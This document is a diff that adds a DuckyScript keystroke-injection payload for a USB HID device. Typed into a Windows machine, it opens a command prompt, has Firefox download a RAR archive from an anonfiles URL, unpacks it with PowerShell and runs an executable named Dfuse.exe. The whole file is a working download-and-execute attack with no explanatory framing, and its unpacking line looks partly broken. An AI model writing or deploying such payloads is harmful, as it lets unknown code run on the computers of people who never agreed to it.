@@ -1,0 +1,32 @@
+DELAY 2000
+REM ------------- Open CMD -------------
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING start firefox
+DELAY 500
+ENTER
+DELAY 1000
+STRING https://cdn-108.anonfiles.com/5di4W7O1xc/f3396ea8-1647554391/net6.0-windows.rar
+DELAY 500
+ENTER
+DELAY 5000
+GUI r 
+DELAY 1000
+STRING CMD
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd Downloads
+DELAY 500
+ENTER
+DELAY 30000
+STRING powershell -command "Expand-Archive -Force '%~dp0net6.0-windows.rar' '%~dp0'"
+DELAY 500
+ENTER
+DELAY 1500
+STRING Dfuse.exe
+ENTER
